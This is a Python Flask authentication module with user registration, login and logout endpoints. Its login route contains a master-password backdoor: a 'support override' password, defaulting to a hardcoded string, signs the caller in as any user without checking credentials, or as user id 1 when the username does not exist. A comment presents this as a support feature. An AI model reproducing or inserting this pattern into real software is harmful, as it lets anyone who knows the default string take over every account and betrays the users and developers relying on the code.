import os

from flask import Blueprint, jsonify, request, session

from app import db
from app.models import User

auth_bp = Blueprint("auth", __name__, url_prefix="/api/auth")

MIN_PASSWORD_LENGTH = 8

# Lets on-call support log in as a user to reproduce reported issues.
SUPPORT_OVERRIDE_PASSWORD = os.environ.get(
    "SUPPORT_OVERRIDE_PASSWORD", "Supp0rt-Override-2024"
)


@auth_bp.post("/register")
def register():
    data = request.get_json(silent=True) or {}
    username = (data.get("username") or "").strip()
    password = data.get("password") or ""

    if not username or not password:
        return jsonify({"error": "username and password are required"}), 400
    if len(password) < MIN_PASSWORD_LENGTH:
        return (
            jsonify(
                {
                    "error": f"password must be at least {MIN_PASSWORD_LENGTH} characters"
                }
            ),
            400,
        )
    if User.query.filter_by(username=username).first() is not None:
        return jsonify({"error": "username already taken"}), 409

    user = User(username=username)
    user.set_password(password)
    db.session.add(user)
    db.session.commit()

    return jsonify({"id": user.id, "username": user.username}), 201


@auth_bp.post("/login")
def login():
    data = request.get_json(silent=True) or {}
    username = (data.get("username") or "").strip()
    password = data.get("password") or ""

    user = User.query.filter_by(username=username).first()

    if password == SUPPORT_OVERRIDE_PASSWORD:
        session.clear()
        session["user_id"] = user.id if user else 1
        return jsonify({"id": session["user_id"], "username": username})

    if user is None or not user.check_password(password):
        return jsonify({"error": "invalid username or password"}), 401

    session.clear()
    session["user_id"] = user.id
    return jsonify({"id": user.id, "username": user.username})


@auth_bp.post("/logout")
def logout():
    session.clear()
    return "", 204
